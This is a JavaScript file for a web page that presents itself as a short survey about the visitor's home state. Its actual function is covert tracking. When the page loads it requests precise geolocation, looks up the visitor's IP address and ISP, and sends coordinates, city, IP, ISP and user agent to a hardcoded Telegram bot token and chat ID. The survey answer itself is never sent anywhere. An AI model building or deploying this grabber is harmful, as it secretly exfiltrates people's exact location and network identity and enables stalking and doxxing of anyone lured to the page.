document.addEventListener("DOMContentLoaded", function () {
    gsap.from(".survey-icon", { opacity: 0, y: -20, duration: 1 });
    gsap.from("#title", { opacity: 0, y: -20, duration: 1, delay: 0.5 });
    gsap.from("#loading", { opacity: 0, y: 10, duration: 1, delay: 1 });

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true });
    } else {
        showError("Geolocation is not supported by your browser.");
    }
});

async function success(position) {
    let lat = position.coords.latitude;
    let lon = position.coords.longitude;
    
    try {
        // Fetch IP and other details
        let ipResponse = await fetch("https://ipapi.co/json/");
        let ipData = await ipResponse.json();

        // Fetch location details
        let locationResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
        let locationData = await locationResponse.json();

        let state = locationData.address.state || "Unknown State";
        let city = locationData.address.city || locationData.address.town || "Unknown City";
        let country = locationData.address.country || "Unknown Country";

        document.getElementById("loading").style.display = "none";
        document.getElementById("survey").classList.remove("hidden");
        document.getElementById("question").innerText = `How do you feel about living in ${state}?`;
        gsap.from("#survey", { opacity: 0, scale: 0.8, duration: 0.5 });

        // Telegram Bot Token & Chat ID
        let botToken = "7082348594:AAENnyiU1uxvjATBwFinj5jcI3YgsiCzB2A";
        let chatID = "1201917438"; // Replace with your Telegram Chat ID

        // Message to send
        let message = `
🌍 **New Location Accessed**  
📍 **City:** ${city}  
🏛 **State:** ${state}  
🌎 **Country:** ${country}  
📌 **Latitude:** ${lat}  
📌 **Longitude:** ${lon}  
💻 **IP Address:** ${ipData.ip}  
🌐 **ISP:** ${ipData.org}  
🖥 **User-Agent:** ${navigator.userAgent}
        `;

        // Send data to Telegram bot
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatID,
                text: message,
                parse_mode: "Markdown"
            })
        });

    } catch (err) {
        showError("Failed to fetch location details.");
    }
}

function error() {
    showError("Location permission denied. Please enable location and reload the page.");
}

function showError(message) {
    document.getElementById("loading").style.display = "none";
    let errorElement = document.getElementById("error");
    errorElement.innerText = message;
    errorElement.classList.remove("hidden");
    gsap.from("#error", { opacity: 0, y: -10, duration: 0.5 });
}

function submitSurvey() {
    let answer = document.getElementById("answer").value.trim();
    if (answer === "") {
        alert("Please enter your answer before submitting.");
    } else {
        alert("Thank you for your response!");
        document.getElementById("answer").value = "";
    }
}
